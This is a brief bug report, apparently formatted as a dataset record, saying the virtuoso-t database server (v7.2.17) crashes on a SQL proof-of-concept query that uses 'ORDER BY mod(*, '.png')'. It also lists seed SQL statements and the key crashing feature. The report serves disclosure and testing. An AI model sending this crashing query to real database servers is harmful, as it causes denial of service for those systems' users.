title: virtuoso-t crash：when entering SQL query to crash the database server
description:
Environment: Ubuntu 22.04, virtuoso v7.2.17 0a2b062
POC
CREATE TABLE v0 ( v1 FLOAT , v2 FLOAT )
SELECT v1 , v1 , mod ( v2 , v2 ) AS result FROM v0 ORDER BY  mod( * , '.png' )

virtuoso-t crashed!!!
bug_features_seed: CREATE TABLE test_table (id INT PRIMARY KEY, name VARCHAR(255), value FLOAT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
INSERT INTO test_table (id, name, value) VALUES (1, 'test1', 10.5), (2, 'test2', NULL), (3, 'test3', 20.0);
SELECT id, name, MOD(value, 1) AS mod_value FROM test_table WHERE value IS NOT NULL ORDER BY MOD(value, 1);
CREATE TABLE another_table (ref_id INT, description TEXT, FOREIGN KEY (ref_id) REFERENCES test_table(id));
key_bug_features: ORDER BY mod( *, '.png' ) in SQL query
